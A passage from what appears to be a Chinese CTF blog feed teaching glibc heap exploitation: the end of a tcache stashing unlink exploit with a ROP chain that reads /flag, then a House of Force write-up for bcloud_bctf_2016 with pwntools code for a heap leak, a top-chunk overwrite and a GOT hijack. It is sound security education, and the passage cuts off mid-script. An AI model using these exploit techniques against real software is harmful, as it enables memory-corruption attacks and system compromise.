class="hljs-string">'\x00'</span>*0x300+p64(0)+p64(0x101)+p64(heap_addr+0x37E0)+p64(heap_addr+0x250+0x10+0x800-0x10)<br><span class="hljs-built_in">edit</span>(2,payload)<br><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-built_in">add</span>(3,2,<span class="hljs-string">'Chunk_3'</span>)<br>lg(<span class="hljs-string">'heap_addr'</span>,heap_addr)<br><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-comment">#ORW</span><br>pop_rdi_ret = libc_base + 0x0000000000026542<br>pop_rsi_ret = libc_base + 0x0000000000026f9e<br>pop_rdx_ret = libc_base + 0x000000000012bda6<br>file_name_addr = heap_addr + 0x0000000000004A40 #下一个chunk的mem位置起始位置<br>flag_addr = file_name_addr + 0x0000000000000200 #将flag写到file_name_addr + 0x0000000000000200处，防止覆盖掉有用内容<br>ROP_chain  = <span class="hljs-string">'/flag\x00\x00\x00'</span><br><span class="hljs-comment">#open(file_name_addr,0)</span><br>ROP_chain += p64(pop_rdi_ret)<br>ROP_chain += p64(file_name_addr)<br>ROP_chain += p64(pop_rsi_ret)<br>ROP_chain += p64(0)<br>ROP_chain += p64(libc_base+libc.symbols[<span class="hljs-string">'open'</span>])<br><span class="hljs-comment">#read(3,flag_addr,0x40)</span><br><span class="hljs-comment">#Read函数的第一个参数文件描述符从0开始累加，</span><br><span class="hljs-comment">#程序进行时内核会自动打开3个文件描述符，0，1，2，分别对应，标准输入、输出和出错，</span><br><span class="hljs-comment">#这样在程序中，每打开一个文件，文件描述符值从3开始累加。</span><br><span class="hljs-comment">#我们打开了一个file_name_addr文件，文件描述符就变为了3，3就代表了file_name_addr文件</span><br><span class="hljs-comment">#read函数第一个参数是3，就是在这个文件里读取数据。</span><br>ROP_chain += p64(pop_rdi_ret)<br>ROP_chain += p64(3)<br>ROP_chain += p64(pop_rsi_ret)<br>ROP_chain += p64(flag_addr)<br>ROP_chain += p64(pop_rdx_ret)<br>ROP_chain += p64(0x40)<br>ROP_chain += p64(libc_base+libc.symbols[<span class="hljs-string">'read'</span>])<br><span class="hljs-comment">#write(1,flag_addr,0x40)</span><br>ROP_chain += p64(pop_rdi_ret)<br>ROP_chain += p64(1)<br>ROP_chain += p64(pop_rsi_ret)<br>ROP_chain += p64(flag_addr)<br>ROP_chain += p64(pop_rdx_ret)<br>ROP_chain += p64(0x40)<br>ROP_chain += p64(libc_base+libc.symbols[<span class="hljs-string">'write'</span>])<br><br><span class="hljs-built_in">add</span>(4,4,ROP_chain)<br><br><span class="hljs-comment">#dbg()</span><br><br>leave_ret = libc_base + 0x0000000000058373<br>ru(<span class="hljs-string">'Your input: '</span>)<br>sl(<span class="hljs-string">'666'</span>)<br>ru(<span class="hljs-string">'What do you want to say?'</span>)<br><span class="hljs-comment">#栈迁移</span><br>sl(<span class="hljs-string">'A'</span><span class="hljs-number">*0</span>x80 + p64(file_name_addr) + p64(leave_ret))<br><br><span class="hljs-comment">#dbg()</span><br>itr()<br></code></pre></td></tr></tbody></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;如果从fastbins中malloc-一个freechunk时，glibc会做以下两个检测：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Tcache Stashing Unlink Attack利用了House of Lore的一些手段，两者都是利用了small bin&lt;/strong</summary>
      
    
    
    
    <category term="heap" scheme="https://kylinxin.github.io/categories/heap/"/>
    
    
    <category term="House of 系列" scheme="https://kylinxin.github.io/tags/House-of-%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>House of Force2</title>
    <link href="https://kylinxin.github.io/2023/04/10/House%20of%20Force2/"/>
    <id>https://kylinxin.github.io/2023/04/10/House%20of%20Force2/</id>
    <published>2023-04-10T15:14:29.000Z</published>
    <updated>2023-09-12T09:16:25.023Z</updated>
    
    <content type="html"><![CDATA[<h1>House Of Force2</h1><p>基于top chunk分配机制的利用,glibc会对用户请求的size_1和top chunk现有的size_0进行验证，如果size_0大于用户申请的chunk大小size_1，就会将从top chunk中切割出size_1大小的chunk，剩余部分放入top chunk。</p><p>如果top chunk足够大（size_0大于top chunk与目标地址的距离），malloc两次，第二次申请的chunk就会到目标地址处，实现一次任意地址写。</p><p>然而实际上top chunk 的size_0，一般不会这么大，所以这种利用手法的前提是可以修改top chunk的size_0大小,把它变成一个很大的数,一般是将其改为-1（32位：0xffffffff，64位:0xffffffffffffffff），因为在将size_0和size_1进行比较时会把size转换成无符号长整型数，因此-1也就是说unsigned long中最大的数。</p><h3 id="glibc源码："><a href="#glibc源码：" class="headerlink" title="glibc源码："></a>glibc源码：</h3><figure class="highlight arduino"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-comment">// 获取当前的top chunk，并计算其对应的大小</span><br>victim = av-&gt;top;<br>size   = <span class="hljs-built_in">chunksize</span>(victim);<br><span class="hljs-comment">// 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。</span><br><span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE)) <br>{<br>    remainder_size = size - nb;<br>    remainder      = <span class="hljs-built_in">chunk_at_offset</span>(victim, nb);<br>    av-&gt;top        = remainder;<br>    <span class="hljs-built_in">set_head</span>(victim, nb | PREV_INUSE |<br>            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>    <span class="hljs-built_in">set_head</span>(remainder, remainder_size | PREV_INUSE);<br><br>    <span class="hljs-built_in">check_malloced_chunk</span>(av, victim, nb);<br>    <span class="hljs-type">void</span> *p = <span class="hljs-built_in">chunk2mem</span>(victim);<br>    <span class="hljs-built_in">alloc_perturb</span>(p, bytes);<br>    <span class="hljs-keyword">return</span> p;<br>}<br></code></pre></td></tr></tbody></table></figure><h1>例题</h1><h2 id="bcloud-bctf-2016"><a href="#bcloud-bctf-2016" class="headerlink" title="bcloud-bctf-2016"></a>bcloud_bctf_2016</h2><p class='item-img' data-src='https://img-blog.csdnimg.cn/b96c270b3de84076b7dafed7be14037b.png?ynotemdtimestamp=1663776491038'><img src="https://img-blog.csdnimg.cn/b96c270b3de84076b7dafed7be14037b.png?ynotemdtimestamp=1663776491038" alt="在这里插入图片描述"></p><p class='item-img' data-src='https://img-blog.csdnimg.cn/4ae14089110b4bdf880e41b9ded19a7c.png?ynotemdtimestamp=1663776491038'><img src="https://img-blog.csdnimg.cn/4ae14089110b4bdf880e41b9ded19a7c.png?ynotemdtimestamp=1663776491038" alt="在这里插入图片描述"><br>程序实现了三个功能，增加一个chunk，编辑一个chunk的内容，删除一个chunk</p><h3 id="add函数"><a href="#add函数" class="headerlink" title="add函数"></a>add函数</h3><figure class="highlight arduino"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">add</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [esp+18h] [ebp-10h]</span><br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [esp+1Ch] [ebp-Ch]</span><br><br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">9</span> &amp;&amp; heap_array[i]; ++i )<br>    ;<br>  <span class="hljs-keyword">if</span> ( i == <span class="hljs-number">10</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Lack of space. Upgrade your account with just $100 :)"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Input the length of the note content:"</span>);<br>  v2 = <span class="hljs-built_in">choose</span>();<br>  heap_array[i] = <span class="hljs-built_in">malloc</span>(v2 + <span class="hljs-number">4</span>);<br>  <span class="hljs-keyword">if</span> ( !heap_array[i] )<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>  dword_804B0A0[i] = v2;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Input the content:"</span>);<br>  <span class="hljs-built_in">readd</span>(heap_array[i], v2, <span class="hljs-number">10</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Create success, the id is %d\n"</span>, i);<br>  result = i;<br>  dword_804B0E0[i] = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">return</span> result;<br>}<br></code></pre></td></tr></tbody></table></figure><p>add函数申请chunk时会创建一个存放所有chunk mem指针的全局数组，思考如果可以申请chunk到全局数组处，修改全局数组，实现任意地址写</p><h3 id="edit函数"><a href="#edit函数" class="headerlink" title="edit函数"></a>edit函数</h3><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">edit</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [esp+14h] [ebp-14h]</span><br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [esp+18h] [ebp-10h]</span><br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [esp+1Ch] [ebp-Ch]</span><br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Input the id:"</span>);<br>  v1 = <span class="hljs-built_in">choose</span>();<br>  <span class="hljs-keyword">if</span> ( v1 &gt;= <span class="hljs-number">0xA</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Invalid ID."</span>);<br>  v2 = heap_array[v1];<br>  <span class="hljs-keyword">if</span> ( !v2 )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Note has been deleted."</span>);<br>  v3 = dword_804B0A0[v1];<br>  dword_804B0E0[v1] = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Input the new content:"</span>);<br>  <span class="hljs-built_in">readd</span>(v2, v3, <span class="hljs-number">10</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Edit success."</span>);<br>}<br></code></pre></td></tr></tbody></table></figure><h3 id="delete函数"><a href="#delete函数" class="headerlink" title="delete函数"></a>delete函数</h3><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">delete</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [esp+18h] [ebp-10h]</span><br>  <span class="hljs-type">void</span> *index; <span class="hljs-comment">// [esp+1Ch] [ebp-Ch]</span><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Input the id:"</span>);<br>  v1 = <span class="hljs-built_in">choose</span>();<br>  <span class="hljs-keyword">if</span> ( v1 &gt;= <span class="hljs-number">0xA</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Invalid ID."</span>);<br>  index = heap_array[v1];<br>  <span class="hljs-keyword">if</span> ( !index )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Note has been deleted."</span>);<br>  heap_array[v1] = <span class="hljs-number">0</span>;<br>  dword_804B0A0[v1] = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">free</span>(index);  #<span class="hljs-function">UAF</span><br><span class="hljs-function">  <span class="hljs-keyword">return</span> <span class="hljs-title">puts</span><span class="hljs-params">(<span class="hljs-string">"Delete success."</span>)</span></span>;<br>}<br></code></pre></td></tr></tbody></table></figure><p>delete函数在释放chunk时存在UAF漏洞</p><h3 id="自定义一个read函数"><a href="#自定义一个read函数" class="headerlink" title="自定义一个read函数"></a>自定义一个read函数</h3><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs awk">int __cdecl readd(int a1, int a2, char a3)<br>{<br>  char buf; <span class="hljs-regexp">//</span> [esp+<span class="hljs-number">1</span>Bh] [ebp-Dh] BYREF<br>  int i; <span class="hljs-regexp">//</span> [esp+<span class="hljs-number">1</span>Ch] [ebp-Ch]<br><br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; a2; ++i )<br>  {<br>    <span class="hljs-keyword">if</span> ( read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">1</span>u) &lt;= <span class="hljs-number">0</span> )<br>      <span class="hljs-keyword">exit</span>(-<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span> ( buf == a3 )<br>      <span class="hljs-keyword">break</span>;<br>    *(a1 + i) = buf;<br>  }<br>  *(i + a1) = <span class="hljs-number">0</span>;<br>  return i;<br>}<br></code></pre></td></tr></tbody></table></figure><p>三个参数，a1为要输入的地址，a2为输入大小，a3为截止符</p><h4 id="先把前面的一些东西写好"><a href="#先把前面的一些东西写好" class="headerlink" title="先把前面的一些东西写好"></a>先把前面的一些东西写好</h4><figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs scss">from pwn import *<br>from LibcSearcher import *<br><span class="hljs-built_in">context</span>(endian='little',os='linux',arch='i386',log_level='debug') #小端序，linux系统，<span class="hljs-number">64</span>位架构,debug<br>#定义gdb调试函数<br>def <span class="hljs-built_in">dbg</span>():<br>        gdb.<span class="hljs-built_in">attach</span>(sh)<br>        <span class="hljs-built_in">pause</span>()<br>#命令简写化<br>s       = lambda data               :sh.<span class="hljs-built_in">send</span>(data)<br>sa      = lambda delim,data         :sh.<span class="hljs-built_in">sendafter</span>(delim, data)<br>sl      = lambda data               :sh.<span class="hljs-built_in">sendline</span>(data)<br>sla     = lambda delim,data         :sh.<span class="hljs-built_in">sendlineafter</span>(delim, data)<br>r       = lambda num=<span class="hljs-number">4096</span>           :sh.<span class="hljs-built_in">recv</span>(num)<br>ru      = lambda delims, drop=True  :sh.<span class="hljs-built_in">recvuntil</span>(delims, drop)<br>itr     = lambda                    :sh.<span class="hljs-built_in">interactive</span>()<br>uu32    = lambda data               :<span class="hljs-built_in">u32</span>(data.<span class="hljs-built_in">ljust</span>(<span class="hljs-number">4</span>,<span class="hljs-string">'\0'</span>))<br>uu64    = lambda data               :<span class="hljs-built_in">u64</span>(data.<span class="hljs-built_in">ljust</span>(<span class="hljs-number">8</span>,<span class="hljs-string">'\0'</span>))<br>leak    = lambda name,addr          :log.<span class="hljs-built_in">success</span>(<span class="hljs-string">'{} = {:#x}'</span>.<span class="hljs-built_in">format</span>(name, addr))<br>lg      = lambda address,data       :log.<span class="hljs-built_in">success</span>(<span class="hljs-string">'%s: '</span>%(address)+<span class="hljs-built_in">hex</span>(data))<br>sh = <span class="hljs-built_in">process</span>(<span class="hljs-string">'./bcloud_bctf_2016'</span>)<br>#sh = <span class="hljs-built_in">remote</span>(<span class="hljs-string">'node4.buuoj.cn'</span>,<span class="hljs-number">26937</span>)<br>elf = <span class="hljs-built_in">ELF</span>(<span class="hljs-string">'./bcloud_bctf_2016'</span>)<br>def <span class="hljs-built_in">add</span>(size,content):<br>   <span class="hljs-built_in">sla</span>(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'1'</span>)<br>   <span class="hljs-built_in">sla</span>(<span class="hljs-string">'note content:'</span>,<span class="hljs-built_in">str</span>(size))<br>   <span class="hljs-built_in">sa</span>(<span class="hljs-string">'content:'</span>,content)<br> <br>def <span class="hljs-built_in">edit</span>(index,content):<br>   <span class="hljs-built_in">sla</span>(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'3'</span>)<br>   <span class="hljs-built_in">sla</span>(<span class="hljs-string">'id:'</span>,<span class="hljs-built_in">str</span>(index))<br>   <span class="hljs-built_in">sa</span>(<span class="hljs-string">'content:'</span>,content)<br> <br>def <span class="hljs-built_in">delete</span>(index):<br>   <span class="hljs-built_in">sla</span>(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'4'</span>)<br>   <span class="hljs-built_in">sla</span>(<span class="hljs-string">'id:'</span>,<span class="hljs-built_in">str</span>(index))<br></code></pre></td></tr></tbody></table></figure><h3 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h3><p>程序没有show函数，无法泄露libc基地址，观察程序发现最开时让我们输入name等信息处存在漏洞<br class='item-img' data-src='https://img-blog.csdnimg.cn/310dfbd7c49e466ebe930d558f79dc43.png?ynotemdtimestamp=1663776491038'><img src="https://img-blog.csdnimg.cn/310dfbd7c49e466ebe930d558f79dc43.png?ynotemdtimestamp=1663776491038" alt="在这里插入图片描述"><br class='item-img' data-src='https://img-blog.csdnimg.cn/6ece0eda6a904752a89a70247f34ad42.png?ynotemdtimestamp=1663776491038'><img src="https://img-blog.csdnimg.cn/6ece0eda6a904752a89a70247f34ad42.png?ynotemdtimestamp=1663776491038" alt="在这里插入图片描述"><br>strcpy复制结束的标志是’\x00’，chunk的mem大小只有64字节，如果输入64字节，show函数会把堆地址泄露出来</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">sa</span><span class="hljs-params">(<span class="hljs-string">'name:'</span>,<span class="hljs-string">'a'</span>*<span class="hljs-number">64</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">ru</span><span class="hljs-params">(<span class="hljs-string">'a'</span>*<span class="hljs-number">64</span>)</span></span><br>heap_addr = <span class="hljs-built_in">u32</span>(<span class="hljs-built_in">r</span>(<span class="hljs-number">4</span>)) - <span class="hljs-number">0</span>x8<br><span class="hljs-function"><span class="hljs-title">lg</span><span class="hljs-params">(<span class="hljs-string">'heap_addr'</span>,heap_addr)</span></span><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/500d6ee32f0344239464a85fc0e0d7b0.png?ynotemdtimestamp=1663776491038'><img src="https://img-blog.csdnimg.cn/500d6ee32f0344239464a85fc0e0d7b0.png?ynotemdtimestamp=1663776491038" alt="在这里插入图片描述"></p><p>再看另一个函数<br class='item-img' data-src='https://img-blog.csdnimg.cn/bb98a27de4be4519be9e3503290cfd6c.png?ynotemdtimestamp=1663776491038'><img src="https://img-blog.csdnimg.cn/bb98a27de4be4519be9e3503290cfd6c.png?ynotemdtimestamp=1663776491038" alt="在这里插入图片描述"></p><h3 id="栈布局"><a href="#栈布局" class="headerlink" title="栈布局"></a>栈布局</h3><figure class="highlight diff"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-0000005C v2 dd ?</span><br><span class="hljs-deletion">-00000058 db ? ; undefined</span><br><span class="hljs-deletion">-00000057 db ? ; undefined</span><br>..........<br><span class="hljs-deletion">-00000016 db ? ; undefined</span><br><span class="hljs-deletion">-00000015 db ? ; undefined</span><br><span class="hljs-deletion">-00000014 v4 dd ?</span><br><span class="hljs-deletion">-00000010 db ? ; undefined</span><br><span class="hljs-deletion">-0000000F db ? ; undefined</span><br><span class="hljs-deletion">-0000000E db ? ; undefined</span><br><span class="hljs-deletion">-0000000D db ? ; undefined</span><br></code></pre></td></tr></tbody></table></figure><p>这里的v2，v3和v4，s都是位于栈上的，且在栈上s和v4的空间是连着的，而strcpy复制结束的标志是’\x00’，如果我们将s填满（b’b’*0x40），再将v3写为0xffffffff，那么strcpy(v4, v3);会把v4变为0xffffffff， strcpy(v2, s);会把b’b’*0x40+0xffffffff复制给v2，而v2也是一个size大小为0x40的chunk的mem指针，0xffffffff将覆盖到chunkv2 的下一位，而下一位正好是top chunk的大小，这样我们就成功将top chunk的大小改为了0xffffffff（-1）</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">sa</span><span class="hljs-params">(<span class="hljs-string">'Org:'</span>,<span class="hljs-string">'a'</span>*<span class="hljs-number">0</span>x40)</span></span><br><span class="hljs-function"><span class="hljs-title">sla</span><span class="hljs-params">(<span class="hljs-string">'Host:'</span>,p32(<span class="hljs-number">0</span>xFFFFFFFF)</span></span>)<br>top_chunk_addr = heap_addr  + <span class="hljs-number">0</span>x48*<span class="hljs-number">3</span> - <span class="hljs-number">0</span>x8<br><span class="hljs-function"><span class="hljs-title">lg</span><span class="hljs-params">(<span class="hljs-string">'top_chunk_addr'</span>,(top_chunk_addr)</span></span>)<br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/1e772846eb6a4d7faeba1dfc57a33fb4.png?ynotemdtimestamp=1663776491038'><img src="https://img-blog.csdnimg.cn/1e772846eb6a4d7faeba1dfc57a33fb4.png?ynotemdtimestamp=1663776491038" alt="在这里插入图片描述"></p><p>之后就来算一下存放chunk指针的全局数组heap_array（0x0804B120）与top chunk的距离，<br>因为程序一开始就申请了三个大小为0x40的chunk(算上头指针为0x48)，第一次泄露的heap已经算上头指针，heap与top chunk距离0x48*3-0x8=0xD0大小，再加上我们一开始泄露出来的heap的地址（heap_addr）就是top chunk的mem指针地址，</p><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">offset</span> = heap_array - （top_chunk_addr +<span class="hljs-number">0</span>x8）- <span class="hljs-number">0</span>x8<br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/887a555d558f466eb43f0f22020b5bf9.png?ynotemdtimestamp=1663776491038'><img src="https://img-blog.csdnimg.cn/887a555d558f466eb43f0f22020b5bf9.png?ynotemdtimestamp=1663776491038" alt="在这里插入图片描述"></p><p>heap_array - top_chunk_addr是top chunk的mem地址,减去0x8字节是top chunk的头指针地址，<br>之后申请offset-0x10大小的chunk，之所以是再减0x8是因为我们要将heap_array作为mem区域来修改，第一次申请offset-0x10大小的chunk，为第二次申请的chunk预留出chunk头的0x8字节大小（0x4字节的pre_size位和0x4字节的now_size位）。再次申请chunk即为heap_array为mem区域的chunk，可修改heap_array数组，</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(offset,<span class="hljs-string">'\n'</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x18,<span class="hljs-string">'\n'</span>)</span></span><br></code></pre></td></tr></tbody></table></figure><p>之后编辑chunk_1来修改heap_array数组</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">puts_plt = elf<span class="hljs-selector-class">.plt</span><span class="hljs-selector-attr">[<span class="hljs-string">'puts'</span>]</span><br>__libc_start_main_got = elf<span class="hljs-selector-class">.got</span><span class="hljs-selector-attr">[<span class="hljs-string">'__libc_start_main'</span>]</span><br>free_got = elf<span class="hljs-selector-class">.got</span><span class="hljs-selector-attr">[<span class="hljs-string">'free'</span>]</span><br><span class="hljs-function"><span class="hljs-title">edit</span><span class="hljs-params">(<span class="hljs-number">1</span>,p32(<span class="hljs-number">0</span>)</span></span> + <span class="hljs-built_in">p32</span>(free_got) + <span class="hljs-built_in">p32</span>(__libc_start_main_got) + <span class="hljs-built_in">p32</span>(heap_array + <span class="hljs-number">0</span>x10) + b<span class="hljs-string">'\x00'</span>*<span class="hljs-number">0</span>x8)<br></code></pre></td></tr></tbody></table></figure><p>此时chunk依次为0，free_got，__libc_start_main_got，heap_array+0x10（保持原3号chunk不变）</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">edit</span><span class="hljs-params">(<span class="hljs-number">1</span>,p32(puts_plt)</span></span> + b<span class="hljs-string">'\n'</span>)<br></code></pre></td></tr></tbody></table></figure><p>此时chunk_1存放free_got地址，编辑chunk_1，将free_got改为puts_plt函数地址</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">delete</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure><p>free（chunk_2），相当于puts(__libc_start_main_got)，泄露__libc_start_main_got地址，得到libc基地址，得到one_gadget地址<br class='item-img' data-src='https://img-blog.csdnimg.cn/b76b20fceb8840b9a7404d1bd7fc1c8b.png?ynotemdtimestamp=1663776491038'><img src="https://img-blog.csdnimg.cn/b76b20fceb8840b9a7404d1bd7fc1c8b.png?ynotemdtimestamp=1663776491038" alt="在这里插入图片描述"></p><figure class="highlight ini"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment">#本地</span><br><span class="hljs-attr">one_gadget</span> = [<span class="hljs-number">0</span>x3ac3c,<span class="hljs-number">0</span>x3ac3e,<span class="hljs-number">0</span>x3ac42,<span class="hljs-number">0</span>x3ac49,<span class="hljs-number">0</span>x5faa5,<span class="hljs-number">0</span>x5faa6]<br><span class="hljs-attr">libc</span> = ELF(<span class="hljs-string">'/home/pwn/tools/glibc-all-in-one/libs/2.23-0ubuntu3_i386/libc-2.23.so'</span>)<br><span class="hljs-comment">#buu远程</span><br><span class="hljs-comment">#one_gadget = [0x3a80c,0x3a80e,0x3a812,0x3a819,0x5f065,0x5f066]</span><br><span class="hljs-comment">#libc = ELF('../../libc-2.23.so--32')</span><br><span class="hljs-attr">libc_base</span> = __libc_start_main_addr - libc.sym[<span class="hljs-string">'__libc_start_main'</span>]<br><span class="hljs-attr">onegadget</span> = 